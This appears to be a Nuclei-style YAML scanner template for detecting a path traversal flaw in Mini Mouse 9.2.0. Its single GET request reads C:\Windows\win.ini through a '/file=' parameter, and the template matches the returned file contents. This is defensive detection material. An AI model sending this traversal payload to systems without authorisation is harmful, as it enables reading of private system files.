id: minimouse-lfi
info:
  author: 0x_Akoko
  name: Mini Mouse 9.2.0 - Path Traversal
  reference: https://www.exploit-db.com/exploits/49744
  severity: high
  tags: minimouse,lfi
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - bit app support
    - fonts
    - extensions
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/file=C:%5CWindows%5Cwin.ini'
